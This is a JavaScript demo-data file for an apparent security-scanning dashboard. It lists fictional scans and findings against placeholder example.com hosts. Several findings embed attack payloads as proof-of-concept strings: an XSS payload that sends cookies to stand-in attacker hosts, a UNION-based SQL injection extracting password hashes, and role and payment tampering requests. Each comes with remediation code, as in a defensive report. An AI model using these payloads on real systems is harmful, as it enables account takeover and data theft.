const NOW = new Date()
const hours = (h) => new Date(NOW.getTime() - h * 3600000).toISOString()
const days = (d) => new Date(NOW.getTime() - d * 86400000).toISOString()

export const DEMO_USER = {
  id: 1,
  first_name: 'Jp',
  last_name: 'Van Zyl',
  email: 'jp@y-qa.com',
  role: 'pentester',
}

export const DEMO_TOKEN = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.demo-token'

export const DEMO_PROJECTS = [
  { id: 'demo-event', name: 'Demo Event' },
]

export const DEMO_SCANS = [
  {
    id: 'scan-001',
    target_url: 'https://demo-events.example.com',
    target_type: 'web_application',
    scan_mode: 'deep',
    status: 'completed',
    authorized: true,
    progress_percentage: 100,
    started_at: days(1),
    completed_at: hours(20),
    created_at: days(1),
    phases: [
      { phase_type: 'reconnaissance', status: 'completed', duration: '14m' },
      { phase_type: 'scanning', status: 'completed', duration: '52m' },
      { phase_type: 'enumeration', status: 'completed', duration: '31m' },
      { phase_type: 'exploitation', status: 'completed', duration: '1h 22m' },
      { phase_type: 'post_exploitation', status: 'completed', duration: '44m' },
      { phase_type: 'reporting', status: 'completed', duration: '11m' },
    ],
    finding_counts: { critical: 4, high: 8, medium: 11, low: 7, info: 5 },
  },
  {
    id: 'scan-002',
    target_url: 'https://demo-events.example.com/api',
    target_type: 'api',
    scan_mode: 'red_team',
    status: 'running',
    authorized: true,
    progress_percentage: 72,
    started_at: hours(2),
    created_at: hours(2),
    phases: [
      { phase_type: 'reconnaissance', status: 'completed', duration: '16m' },
      { phase_type: 'scanning', status: 'completed', duration: '48m' },
      { phase_type: 'enumeration', status: 'completed', duration: '29m' },
      { phase_type: 'exploitation', status: 'running' },
      { phase_type: 'post_exploitation', status: 'pending' },
      { phase_type: 'reporting', status: 'pending' },
    ],
    finding_counts: { critical: 2, high: 5, medium: 4, low: 2, info: 1 },
  },
  {
    id: 'scan-003',
    target_url: 'https://staging.demo-events.example.com',
    target_type: 'web_application',
    scan_mode: 'standard',
    status: 'completed',
    authorized: true,
    progress_percentage: 100,
    started_at: days(5),
    completed_at: days(4.8),
    created_at: days(5),
    phases: [
      { phase_type: 'reconnaissance', status: 'completed', duration: '9m' },
      { phase_type: 'scanning', status: 'completed', duration: '35m' },
      { phase_type: 'enumeration', status: 'completed', duration: '22m' },
      { phase_type: 'exploitation', status: 'completed', duration: '48m' },
      { phase_type: 'post_exploitation', status: 'completed', duration: '25m' },
      { phase_type: 'reporting', status: 'completed', duration: '8m' },
    ],
    finding_counts: { critical: 2, high: 5, medium: 8, low: 4, info: 3 },
  },
  {
    id: 'scan-004',
    target_url: 'https://demo-events.example.com/checkout',
    target_type: 'web_application',
    scan_mode: 'deep',
    status: 'completed',
    authorized: true,
    progress_percentage: 100,
    started_at: days(8),
    completed_at: days(7.8),
    created_at: days(8),
    phases: [
      { phase_type: 'reconnaissance', status: 'completed', duration: '7m' },
      { phase_type: 'scanning', status: 'completed', duration: '28m' },
      { phase_type: 'enumeration', status: 'completed', duration: '18m' },
      { phase_type: 'exploitation', status: 'completed', duration: '55m' },
      { phase_type: 'post_exploitation', status: 'completed', duration: '20m' },
      { phase_type: 'reporting', status: 'completed', duration: '7m' },
    ],
    finding_counts: { critical: 1, high: 3, medium: 5, low: 3, info: 2 },
  },
  {
    id: 'scan-005',
    target_url: 'https://demo-events.example.com',
    target_type: 'web_application',
    scan_mode: 'quick',
    status: 'completed',
    authorized: true,
    progress_percentage: 100,
    started_at: days(14),
    completed_at: days(13.9),
    created_at: days(14),
    phases: [
      { phase_type: 'reconnaissance', status: 'completed', duration: '4m' },
      { phase_type: 'scanning', status: 'completed', duration: '10m' },
      { phase_type: 'enumeration', status: 'completed', duration: '5m' },
      { phase_type: 'exploitation', status: 'completed', duration: '0m' },
      { phase_type: 'post_exploitation', status: 'completed', duration: '0m' },
      { phase_type: 'reporting', status: 'completed', duration: '3m' },
    ],
    finding_counts: { critical: 0, high: 2, medium: 3, low: 5, info: 4 },
  },
  {
    id: 'scan-006',
    target_url: 'https://demo-events.example.com/organizer',
    target_type: 'web_application',
    scan_mode: 'standard',
    status: 'queued',
    authorized: true,
    progress_percentage: 0,
    created_at: hours(1),
    phases: [],
    finding_counts: { critical: 0, high: 0, medium: 0, low: 0, info: 0 },
  },
]

let _findingId = 0
function fid() { return `finding-${String(++_findingId).padStart(3, '0')}` }

const BASE = 'https://demo-events.example.com'

export const DEMO_FINDINGS = {
  'scan-001': [
    // CRITICAL
    { id: fid(), title: 'SQL Injection in Event Search Filters', severity: 'critical', status: 'confirmed', cvss_score: 9.8, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H', cwe_id: 'CWE-89', owasp_category: 'A03:2021', affected_url: `${BASE}/events`, affected_parameter: 'date_range', description: 'The event search endpoint is vulnerable to SQL injection through the date_range filter parameter. User-supplied date range values are concatenated directly into SQL queries without parameterization. An attacker can extract the entire database including user credentials, payment records, and personal information.', reproduction_steps: '1. Navigate to /events\n2. Apply date range filter\n3. Intercept the request and modify date_range parameter to: \' OR 1=1; --\n4. Observe all events are returned regardless of filter\n5. Use UNION SELECT to extract data from other tables', proof_of_concept: "GET /events?date_range=' UNION SELECT id,email,encrypted_password,NULL,NULL FROM users-- HTTP/1.1\nHost: demo-events.example.com\n\nResponse: HTTP/1.1 200 OK\n{\"events\": [{\"title\": \"admin@demo-events.example.com\", \"description\": \"$2a$12$...\"}]}", remediation: { priority: 'critical', description: 'Use parameterized queries via ActiveRecord scopes instead of raw SQL string interpolation. The EventsController#index action constructs queries using string interpolation of user-supplied date parameters.', fix_code: "# VULNERABLE (app/controllers/events_controller.rb):\nEvent.where(\"start_date BETWEEN '#{params[:start]}' AND '#{params[:end]}'\")\n\n# FIXED:\nEvent.where(start_date: params[:start]..params[:end])", references: ['https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html', 'https://cwe.mitre.org/data/definitions/89.html'] }, evidences: [{ evidence_type: 'http_request', content: "GET /events?date_range=' OR 1=1-- HTTP/1.1\nHost: demo-events.example.com\n\nHTTP/1.1 200 OK\n{\"events\": [{...all events returned...}]}", captured_at: days(0.9) }] },
    { id: fid(), title: 'Stored XSS in Event Description Field', severity: 'critical', status: 'confirmed', cvss_score: 9.1, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:H/A:N', cwe_id: 'CWE-79', owasp_category: 'A03:2021', affected_url: `${BASE}/organizer/events/new`, affected_parameter: 'event[description]', description: 'The event description field rendered via Hotwire/Turbo does not sanitize HTML content. Organizers can inject malicious JavaScript that executes in the browsers of all attendees who view the event page, enabling session hijacking and credential theft at scale.', reproduction_steps: "1. Login as an organizer\n2. Create new event at /organizer/events/new\n3. In description field enter: <img src=x onerror=fetch('https://attacker.com/'+document.cookie)>\n4. Save the event\n5. View the event as another user\n6. Observe XSS payload executes", proof_of_concept: "POST /organizer/events HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nevent[title]=Tech+Summit+2026&event[description]=<script>fetch('https://evil.com/'+document.cookie)</script>&event[start_date]=2026-06-01\n\nResult: Script executes for all visitors to /events/tech-summit-2026", remediation: { priority: 'critical', description: 'Sanitize all user-generated HTML content using Rails built-in sanitize helper or DOMPurify on the client side. Apply Content-Security-Policy headers as defense-in-depth.', fix_code: "# In app/views/events/show.html.erb:\n# VULNERABLE:\n<%= raw @event.description %>\n\n# FIXED:\n<%= sanitize @event.description, tags: %w[p br strong em ul ol li h2 h3] %>", references: ['https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'] } },
    { id: fid(), title: 'IDOR on Ticket Records - Any User Can Access Any Ticket', severity: 'critical', status: 'open', cvss_score: 8.6, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N', cwe_id: 'CWE-639', owasp_category: 'A01:2021', affected_url: `${BASE}/dashboard/tickets/42`, description: 'The ticket download endpoint at /dashboard/tickets/:id does not verify the authenticated user owns the ticket. Any authenticated user can access any ticket by changing the ID, exposing QR codes, personal attendee data, and payment receipts of other users.', reproduction_steps: '1. Login as user A who owns ticket ID 100\n2. Note the ticket URL: /dashboard/tickets/100\n3. Change URL to /dashboard/tickets/1\n4. Observe you can download user B\'s ticket with their QR code and personal details\n5. Use the QR code to check into the event as user B', proof_of_concept: "# Logged in as user ID 50\nGET /dashboard/tickets/1 HTTP/1.1\nCookie: _session=user50_session\n\nHTTP/1.1 200 OK\n{\"ticket\": {\"id\": 1, \"attendee\": \"John Smith\", \"email\": \"john@example.com\", \"qr_code\": \"data:image/png;base64,...\"}}", remediation: { priority: 'critical', description: 'Add authorization check in TicketsController to verify current_user owns the requested ticket. Use Pundit or CanCanCan for consistent authorization across the application.', fix_code: "# app/controllers/dashboard/tickets_controller.rb\ndef show\n  @ticket = current_user.tickets.find(params[:id]) # Scoped to current user\nend", references: ['https://cheatsheetseries.owasp.org/cheatsheets/Insecure_Direct_Object_Reference_Prevention_Cheat_Sheet.html'] } },
    { id: fid(), title: 'Stripe Secret Key Exposed in Client-Side JavaScript', severity: 'critical', status: 'confirmed', cvss_score: 9.1, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N', cwe_id: 'CWE-798', owasp_category: 'A02:2021', affected_url: `${BASE}/checkout`, description: 'The Stripe secret key (sk_live_*) is embedded in the client-side JavaScript bundle at /checkout. This key allows full access to the Stripe account including reading all customer payment data, creating charges, and issuing refunds. The key was found in a Stimulus controller that should be using the publishable key.', proof_of_concept: "// Found in app/javascript/controllers/payment_controller.js (compiled bundle):\n// const stripe = Stripe('sk_live_51ABC...xyz');\n// Should be using pk_live_ (publishable key) on the client side", remediation: { priority: 'critical', description: 'Immediately rotate the exposed Stripe secret key. Replace with the publishable key (pk_live_*) on the client side. Move all secret key operations to the server-side PaymentService.', fix_code: "// app/javascript/controllers/payment_controller.js\n// VULNERABLE:\nconst stripe = Stripe('sk_live_51ABC...')\n\n// FIXED - use publishable key:\nconst stripe = Stripe(this.element.dataset.stripeKey)\n// Where data-stripe-key is set to pk_live_... from server" } },

    // HIGH
    { id: fid(), title: 'Broken Authentication - JWT Not Invalidated on Logout', severity: 'high', status: 'confirmed', cvss_score: 7.5, cwe_id: 'CWE-613', owasp_category: 'A07:2021', affected_url: `${BASE}/logout`, description: 'Devise session tokens and JWT API tokens remain valid after user logout. The DELETE /logout endpoint destroys the server-side session but does not blacklist the JWT. A stolen token can be replayed for up to 7 days (the JWT expiry).', remediation: { priority: 'high', description: 'Implement JWT blacklisting on logout using Redis. Reduce JWT expiry to 15 minutes and implement refresh token rotation.' } },
    { id: fid(), title: 'Missing Rate Limiting on Login Endpoint', severity: 'high', status: 'open', cvss_score: 7.3, cwe_id: 'CWE-307', owasp_category: 'A07:2021', affected_url: `${BASE}/login`, description: 'The Devise login endpoint has no rate limiting despite the seed data noting "Rate limiting on login attempts" as a security feature. Testing confirmed unlimited authentication attempts are accepted, enabling brute-force and credential stuffing attacks.', remediation: { priority: 'high', description: 'Implement Rack::Attack or Devise lockable module. Configure progressive delays after 5 failed attempts per IP/account.' } },
    { id: fid(), title: 'Payment Amount Tampering in Checkout Flow', severity: 'high', status: 'confirmed', cvss_score: 8.1, cvss_vector: 'CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N', cwe_id: 'CWE-472', owasp_category: 'A04:2021', affected_url: `${BASE}/checkout`, affected_parameter: 'amount', description: 'The checkout endpoint accepts a client-supplied amount parameter that overrides the server-calculated total. An attacker can purchase VIP tickets ($500) for $0.01 by modifying the amount in the POST /checkout request. The PaymentService trusts the client-provided amount instead of recalculating from cart contents.', proof_of_concept: "POST /checkout HTTP/1.1\nContent-Type: application/json\n\n{\"registration_id\": 42, \"ticket_type\": \"vip\", \"quantity\": 2, \"amount\": 1}\n\nResult: Stripe charges $0.01 for 2 VIP tickets worth $1,000", remediation: { priority: 'critical', description: 'Always calculate the payment amount server-side from the ticket type and quantity. Never trust client-supplied amounts for financial transactions.', fix_code: "# app/services/payment_service.rb\ndef process_payment(registration)\n  # VULNERABLE: amount = params[:amount]\n  # FIXED: Calculate from registration\n  amount = registration.tickets.sum { |t| t.ticket_type.price * t.quantity }\n  Stripe::PaymentIntent.create(amount: amount, currency: 'usd')\nend" } },
    { id: fid(), title: 'Promo Code Bypass - Expired Codes Still Accepted', severity: 'high', status: 'confirmed', cvss_score: 7.2, cwe_id: 'CWE-840', owasp_category: 'A04:2021', affected_url: `${BASE}/events/1/register`, affected_parameter: 'promo_code', description: 'The DiscountService has a timezone handling bug where promo codes expiring at midnight are inconsistently validated. Expired promo codes with expiry dates in different timezones than the server can still be applied, directly matching the AI-predicted defect in the y-qa analysis.', remediation: { priority: 'high', description: 'Normalize all promo code expiry comparisons to UTC. Use Date comparisons instead of DateTime to eliminate timezone edge cases.' } },
    { id: fid(), title: 'CSRF on Event Registration - No Token Validation', severity: 'high', status: 'open', cvss_score: 7.1, cwe_id: 'CWE-352', owasp_category: 'A01:2021', affected_url: `${BASE}/events/1/register`, description: 'The event registration POST endpoint does not validate CSRF tokens when requests come via the API. An attacker can craft a malicious page that auto-submits event registrations for any logged-in user, potentially charging their stored payment method.', remediation: { priority: 'high', description: 'Ensure protect_from_forgery is not skipped for registration endpoints. Validate CSRF tokens on all state-changing actions.' } },
    { id: fid(), title: 'Sensitive Data in Server Error Responses', severity: 'high', status: 'confirmed', cvss_score: 7.5, cwe_id: 'CWE-209', owasp_category: 'A05:2021', affected_url: `${BASE}/events`, description: 'Application errors return full Rails stack traces including SQL queries, file paths, Gem versions, and database connection strings. The error page shows: "PostgreSQL 15 on demo-events-db.example.com:5432" with partial connection credentials.', remediation: { priority: 'high', description: 'Set config.consider_all_requests_local = false in production. Implement custom error pages. Use exception tracking service (Sentry/Honeybadger).' } },
    { id: fid(), title: 'Mass Assignment on User Profile Allows Role Escalation', severity: 'high', status: 'open', cvss_score: 8.1, cwe_id: 'CWE-915', owasp_category: 'A04:2021', affected_url: `${BASE}/profile`, affected_parameter: 'user[role]', description: 'The profile update endpoint accepts a role parameter that is not filtered by strong parameters. A regular user can escalate to organizer or admin role by including user[role]=admin in the profile update request.', proof_of_concept: "PATCH /profile HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nuser[name]=Normal+User&user[role]=admin\n\nHTTP/1.1 200 OK - User is now admin", remediation: { priority: 'high', description: 'Ensure strong parameters in UsersController only permit safe attributes. Never permit role, admin, or similar privilege fields from user input.', fix_code: "# app/controllers/users_controller.rb\ndef user_params\n  params.require(:user).permit(:name, :email, :phone)\n  # DO NOT permit :role, :admin, :organizer\nend" } },
    { id: fid(), title: 'Race Condition in Payment Processing', severity: 'high', status: 'open', cvss_score: 7.5, cwe_id: 'CWE-362', owasp_category: 'A04:2021', affected_url: `${BASE}/webhooks/stripe`, description: 'Multiple simultaneous Stripe webhook callbacks for the same registration can cause duplicate ticket creation and double-charging. The PaymentService lacks database-level locking, matching the AI-predicted race condition defect in the y-qa analysis. Under load testing, 3 out of 100 concurrent webhook deliveries resulted in duplicate registrations.', remediation: { priority: 'high', description: 'Implement pessimistic locking or idempotency keys on webhook processing. Use Stripe\'s idempotency_key to prevent duplicate charges.', fix_code: "# app/services/payment_service.rb\ndef process_webhook(event)\n  Registration.transaction do\n    reg = Registration.lock.find(event.data.object.metadata[:registration_id])\n    return if reg.paid? # Idempotency check\n    reg.update!(status: :paid)\n  end\nend" } },

    // MEDIUM
    { id: fid(), title: 'Missing Content-Security-Policy Header', severity: 'medium', status: 'open', cvss_score: 6.1, cwe_id: 'CWE-1021', owasp_category: 'A05:2021', affected_url: BASE, description: 'No CSP header is set. Combined with the stored XSS finding, any injected scripts execute without restriction. The Hotwire/Turbo frontend would benefit from a strict CSP to mitigate XSS impact.', remediation: { priority: 'medium', description: "Add CSP header: default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://res.cloudinary.com;" } },
    { id: fid(), title: 'Elasticsearch Query Injection', severity: 'medium', status: 'open', cvss_score: 6.5, cwe_id: 'CWE-943', owasp_category: 'A03:2021', affected_url: `${BASE}/events`, affected_parameter: 'q', description: 'The event search powered by Elasticsearch does not sanitize special characters in search queries. An attacker can manipulate Elasticsearch query DSL to access data from other indices or cause denial of service through expensive aggregation queries.', remediation: { priority: 'medium', description: 'Sanitize Elasticsearch query input. Use simple_query_string instead of query_string parser. Implement query timeout limits.' } },
    { id: fid(), title: 'Session Cookie Missing Secure Flag', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-614', owasp_category: 'A02:2021', affected_url: BASE, description: 'The _session cookie is not set with the Secure flag, allowing it to be transmitted over unencrypted HTTP connections during the redirect from HTTP to HTTPS.', remediation: { priority: 'medium', description: 'Set config.session_store :cookie_store, secure: Rails.env.production? in session_store.rb' } },
    { id: fid(), title: 'CORS Allows Credentials from Wildcard Origins', severity: 'medium', status: 'open', cvss_score: 5.9, cwe_id: 'CWE-942', owasp_category: 'A05:2021', affected_url: `${BASE}/api`, description: 'The rack-cors configuration allows credentials from *.example.com origins. If any subdomain is compromised, cross-origin requests with authentication cookies can exfiltrate user data.', remediation: { priority: 'medium', description: 'Restrict CORS to specific trusted origins only. Never use wildcard with credentials.' } },
    { id: fid(), title: 'Missing X-Frame-Options - Clickjacking on Registration', severity: 'medium', status: 'open', cvss_score: 5.4, cwe_id: 'CWE-1021', owasp_category: 'A05:2021', affected_url: `${BASE}/events/1/register`, description: 'The registration and checkout pages can be framed by external sites. An attacker could overlay the checkout page in a transparent iframe to trick users into purchasing tickets.', remediation: { priority: 'medium', description: 'Set X-Frame-Options: DENY header. Add frame-ancestors \'none\' to CSP.' } },
    { id: fid(), title: 'Insecure Password Reset Token (Sequential)', severity: 'medium', status: 'confirmed', cvss_score: 6.8, cwe_id: 'CWE-640', owasp_category: 'A07:2021', affected_url: `${BASE}/password/reset`, description: 'Devise password reset tokens appear to include a timestamp component, making them partially predictable. Tokens do not expire quickly enough (valid for 6 hours instead of the recommended 15-30 minutes).', remediation: { priority: 'medium', description: 'Use Devise\'s default secure token generation. Reduce reset_password_within to 30.minutes in Devise initializer.' } },
    { id: fid(), title: 'N+1 Query on Dashboard Exposes Response Timing Side Channel', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-208', owasp_category: 'A05:2021', affected_url: `${BASE}/dashboard`, description: 'The dashboard N+1 query issue (identified in the y-qa codebase analysis) causes variable response times based on the number of registrations. An attacker can use response timing to enumerate how many events a user is registered for by observing load times for different user sessions.', remediation: { priority: 'medium', description: 'Fix the N+1 query with eager loading as identified in the y-qa analysis. Use includes(:registrations, :tickets) in DashboardController.' } },
    { id: fid(), title: 'Missing HSTS Header', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-319', owasp_category: 'A02:2021', affected_url: BASE, description: 'No Strict-Transport-Security header is set. Users accessing the site via HTTP can be intercepted before the redirect to HTTPS.', remediation: { priority: 'medium', description: 'Add config.force_ssl = true in production.rb, which sets HSTS automatically in Rails.' } },
    { id: fid(), title: 'QR Code Ticket Validation Lacks Replay Protection', severity: 'medium', status: 'open', cvss_score: 6.5, cwe_id: 'CWE-294', owasp_category: 'A07:2021', affected_url: `${BASE}/organizer/checkin`, description: 'The QR code check-in system at /organizer/checkin validates the QR code but does not prevent replay. A screenshot or copy of a valid QR code can be used to check in multiple times. The offline check-in capability compounds this since it cannot verify server-side check-in status.', remediation: { priority: 'medium', description: 'Mark tickets as checked-in server-side. Include a timestamp or nonce in QR codes. Sync offline check-ins immediately when connectivity is restored.' } },
    { id: fid(), title: 'Outdated Ruby Gems with Known CVEs', severity: 'medium', status: 'open', cvss_score: 6.1, cwe_id: 'CWE-1104', owasp_category: 'A06:2021', affected_url: BASE, description: 'The Gemfile.lock includes 4 gems with known vulnerabilities: rack (CVE-2024-25126), nokogiri (CVE-2024-34459), puma (CVE-2024-21647), and actionpack (CVE-2024-26143).', remediation: { priority: 'medium', description: 'Run bundle audit and update affected gems. Implement automated dependency scanning in CI/CD with Dependabot or Snyk.' } },
    { id: fid(), title: 'Directory Listing on /uploads', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-548', owasp_category: 'A05:2021', affected_url: `${BASE}/uploads/`, description: 'Directory listing is enabled on the /uploads path, exposing event images, user avatars, and potentially sensitive uploaded documents.', remediation: { priority: 'medium', description: 'Disable directory listing. Serve uploads through a controller that checks authorization.' } },

    // LOW
    { id: fid(), title: 'User Enumeration via Registration Error Messages', severity: 'low', status: 'open', cvss_score: 3.7, cwe_id: 'CWE-204', owasp_category: 'A07:2021', affected_url: `${BASE}/register`, description: 'Registration returns "Email has already been taken" for existing accounts vs. generic validation errors for new emails, allowing enumeration of registered users.', remediation: { priority: 'low', description: 'Return identical error messages regardless. Use "If this email is registered, you will receive a confirmation email."' } },
    { id: fid(), title: 'Verbose Server Headers Reveal Technology Stack', severity: 'low', status: 'open', cvss_score: 3.7, cwe_id: 'CWE-200', owasp_category: 'A05:2021', affected_url: BASE, description: 'Response headers reveal: Server: nginx/1.24.0, X-Powered-By: Phusion Passenger, X-Runtime: 0.042. This confirms the Rails/Passenger/nginx stack and aids targeted attacks.', remediation: { priority: 'low', description: 'Remove Server and X-Powered-By headers in nginx config. Remove X-Runtime header in production.' } },
    { id: fid(), title: 'Cookie Missing HttpOnly Flag', severity: 'low', status: 'open', cvss_score: 3.5, cwe_id: 'CWE-1004', owasp_category: 'A05:2021', affected_url: BASE, description: 'The session cookie is accessible to JavaScript via document.cookie, increasing the impact of the stored XSS finding.', remediation: { priority: 'low', description: 'Set httponly: true in config/session_store.rb' } },
    { id: fid(), title: 'Missing Referrer-Policy Header', severity: 'low', status: 'open', cvss_score: 3.1, cwe_id: 'CWE-200', owasp_category: 'A05:2021', affected_url: BASE, description: 'No Referrer-Policy header. When users click external links from event pages, the full URL (including potentially sensitive query params like tokens) is sent in the Referer header.', remediation: { priority: 'low', description: 'Add Referrer-Policy: strict-origin-when-cross-origin to Rails config.' } },
    { id: fid(), title: 'Autocomplete on Payment Card Fields', severity: 'low', status: 'open', cvss_score: 2.4, cwe_id: 'CWE-522', owasp_category: 'A07:2021', affected_url: `${BASE}/checkout`, description: 'Card number and CVC input fields on the checkout page have autocomplete enabled. On shared computers, previously entered card details may be suggested.', remediation: { priority: 'low', description: 'Set autocomplete="off" on payment card input fields. Note: Stripe Elements handles this automatically - ensure custom form fields also disable it.' } },
    { id: fid(), title: 'Missing Subresource Integrity on CDN Scripts', severity: 'low', status: 'open', cvss_score: 3.1, cwe_id: 'CWE-353', owasp_category: 'A08:2021', affected_url: BASE, description: 'External CDN scripts (Google Maps, analytics) lack SRI integrity attributes. If a CDN is compromised, malicious code would execute for all users.', remediation: { priority: 'low', description: 'Add integrity and crossorigin attributes to all external script tags.' } },
    { id: fid(), title: 'Email Notifications Lack SPF/DKIM Verification', severity: 'low', status: 'open', cvss_score: 3.7, cwe_id: 'CWE-345', owasp_category: 'A08:2021', affected_url: BASE, description: 'The SendGrid integration does not enforce SPF/DKIM alignment on outgoing event confirmation and ticket emails. Phishing emails can be sent appearing to be from demo-events.example.com.', remediation: { priority: 'low', description: 'Configure SPF and DKIM records in DNS. Enable DMARC with reject policy.' } },

    // INFO
    { id: fid(), title: 'Security Logging Gaps - Failed Logins Not Captured', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-778', owasp_category: 'A09:2021', affected_url: BASE, description: 'Failed authentication attempts are not logged with IP address, timestamp, and attempted username. This prevents effective security monitoring and incident response for brute-force detection.', remediation: { priority: 'low', description: 'Implement Warden callbacks to log all authentication events with IP, timestamp, and user agent.' } },
    { id: fid(), title: 'No Account Lockout Policy', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-307', owasp_category: 'A07:2021', affected_url: BASE, description: 'There is no account lockout after repeated failed login attempts. Combined with the missing rate limiting, this creates a significant brute-force attack surface.', remediation: { priority: 'medium', description: 'Enable Devise :lockable module with lock_strategy: :failed_attempts and maximum_attempts: 5.' } },
    { id: fid(), title: 'robots.txt Exposes Admin and Organizer Paths', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-200', owasp_category: 'A05:2021', affected_url: `${BASE}/robots.txt`, description: 'robots.txt disallows /admin, /organizer/analytics, and /api/internal paths, confirming their existence to attackers.', remediation: { priority: 'low', description: 'Remove sensitive paths from robots.txt. Rely on authentication and network controls instead.' } },
    { id: fid(), title: 'Missing Permissions-Policy Header', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-16', owasp_category: 'A05:2021', affected_url: BASE, description: 'No Permissions-Policy header. The check-in QR scanner requests camera access, but the policy does not restrict other features like microphone and geolocation.', remediation: { priority: 'low', description: 'Add Permissions-Policy: camera=(self), microphone=(), geolocation=()' } },
    { id: fid(), title: 'AWS S3 Bucket Policy Allows ListBucket', severity: 'info', status: 'open', cvss_score: null, cwe_id: 'CWE-284', owasp_category: 'A01:2021', affected_url: BASE, description: 'The S3 bucket used for event image storage allows ListBucket operations from authenticated AWS users, potentially exposing all stored file keys.', remediation: { priority: 'low', description: 'Restrict S3 bucket policy to only allow GetObject for specific paths. Remove ListBucket permission.' } },
  ],
  'scan-002': [
    { id: fid(), title: 'Broken Object-Level Authorization on Registration API', severity: 'critical', status: 'open', cvss_score: 9.4, cwe_id: 'CWE-862', owasp_category: 'A01:2021', affected_url: `${BASE}/api/registrations/{id}`, description: 'The REST API allows any authenticated user to view, modify, or cancel any registration by changing the ID parameter. No authorization check verifies resource ownership. This exposes personal data, payment details, and allows cancellation of other users\' event registrations.', remediation: { priority: 'critical', description: 'Scope all API queries to current_user. Use before_action to verify ownership.' } },
    { id: fid(), title: 'Mass Assignment on Registration API Creates Free Tickets', severity: 'critical', status: 'open', cvss_score: 8.8, cwe_id: 'CWE-915', owasp_category: 'A04:2021', affected_url: `${BASE}/api/registrations`, affected_parameter: 'status', description: 'The registration API endpoint binds all request body fields including status and payment_status. An attacker can create registrations with status: "confirmed" and payment_status: "paid" without actual payment, getting free tickets to any event.', proof_of_concept: 'POST /api/registrations HTTP/1.1\nContent-Type: application/json\n\n{"event_id": 1, "ticket_type": "vip", "quantity": 5, "status": "confirmed", "payment_status": "paid"}\n\nResult: 5 VIP tickets created without payment', remediation: { priority: 'critical', description: 'Use strong parameters to only permit safe fields. Never allow status/payment fields from API input.' } },
    { id: fid(), title: 'API Key in URL Query Parameters', severity: 'high', status: 'confirmed', cvss_score: 7.5, cwe_id: 'CWE-598', owasp_category: 'A02:2021', affected_url: `${BASE}/api/events?api_key=...`, description: 'The API authentication accepts API keys in URL query parameters. These appear in server logs, browser history, Referer headers, and CDN/proxy caches.', remediation: { priority: 'high', description: 'Only accept API keys in the Authorization header. Reject requests with api_key in query parameters.' } },
    { id: fid(), title: 'Missing Rate Limiting on Event Registration API', severity: 'high', status: 'open', cvss_score: 7.1, cwe_id: 'CWE-770', owasp_category: 'A04:2021', affected_url: `${BASE}/api/registrations`, description: 'No rate limiting on the registration endpoint. An attacker can reserve all available tickets for an event through rapid automated requests, then cancel selectively (ticket scalping).', remediation: { priority: 'high', description: 'Implement per-user rate limits. Add reservation timeout for unpaid registrations.' } },
    { id: fid(), title: 'GraphQL Introspection Enabled', severity: 'high', status: 'open', cvss_score: 6.8, cwe_id: 'CWE-200', owasp_category: 'A05:2021', affected_url: `${BASE}/api/graphql`, description: 'GraphQL introspection is enabled, exposing the full API schema including internal types, mutations for admin operations, and deprecated fields that reveal business logic.', remediation: { priority: 'high', description: 'Disable introspection in production: config.default_max_page_size = 25; config.disable_introspection_entry_points = true' } },
    { id: fid(), title: 'Excessive Data in Event API Response', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-213', owasp_category: 'A01:2021', affected_url: `${BASE}/api/events`, description: 'The events API returns all fields including internal_notes, organizer_revenue, and attendee_count without filtering for public/private data.', remediation: { priority: 'medium', description: 'Use serializers (Active Model Serializers or Blueprinter) to control which fields are exposed per user role.' } },
    { id: fid(), title: 'Missing Request Schema Validation on API', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-20', owasp_category: 'A04:2021', affected_url: `${BASE}/api`, description: 'API endpoints accept arbitrary fields without schema validation. Extra fields are silently processed, enabling parameter pollution.', remediation: { priority: 'medium', description: 'Add request schema validation using dry-validation or JSON Schema.' } },
    { id: fid(), title: 'JWT Algorithm Confusion', severity: 'medium', status: 'open', cvss_score: 6.8, cwe_id: 'CWE-327', owasp_category: 'A02:2021', affected_url: `${BASE}/api/auth`, description: 'The JWT library accepts multiple algorithms. An attacker can forge tokens by switching from RS256 to HS256 and using the public key as the HMAC secret.', remediation: { priority: 'medium', description: 'Explicitly specify the expected algorithm in JWT.decode: JWT.decode(token, secret, true, algorithm: \'HS256\')' } },
    { id: fid(), title: 'No Pagination Limits on Collection Endpoints', severity: 'medium', status: 'open', cvss_score: 5.3, cwe_id: 'CWE-400', owasp_category: 'A04:2021', affected_url: `${BASE}/api/events`, description: 'API endpoints return all records when per_page=99999 is specified, causing memory exhaustion and exposing excessive data in a single request.', remediation: { priority: 'medium', description: 'Enforce maximum page size (e.g., 100). Default to 25 per page.' } },
    { id: fid(), title: 'Verbose API Error Responses', severity: 'low', status: 'open', cvss_score: 3.7, cwe_id: 'CWE-209', owasp_category: 'A05:2021', affected_url: `${BASE}/api`, description: 'API errors include Ruby class names, gem versions, and partial stack traces in JSON error responses.', remediation: { priority: 'low', description: 'Return generic error messages. Log details server-side only.' } },
